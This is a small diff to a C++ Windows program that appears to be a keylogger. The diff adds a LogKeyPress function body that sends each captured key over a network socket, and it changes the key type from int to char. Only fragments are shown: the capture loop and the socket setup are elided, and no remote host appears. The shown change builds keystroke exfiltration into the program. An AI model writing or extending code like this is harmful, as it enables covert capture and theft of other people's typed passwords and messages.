@@ -9,8 +9,9 @@
 #include <string>
 #include <conio.h>
 #include "WSAInitializer.h"
-#include <thread>
-void LogKeyPress(int key, SOCKET sock);
+#include <string>
+
+void LogKeyPress(char key, SOCKET sock);
 
 int main() 
 {
@@ -60,7 +61,7 @@ int main()
 	}
 }
 
-void LogKeyPress(int key, SOCKET sock)
+void LogKeyPress(char key, SOCKET sock)
 {
-
+	send(sock,std::to_string(key).c_str(), std::to_string(key).size(), 0);
 }
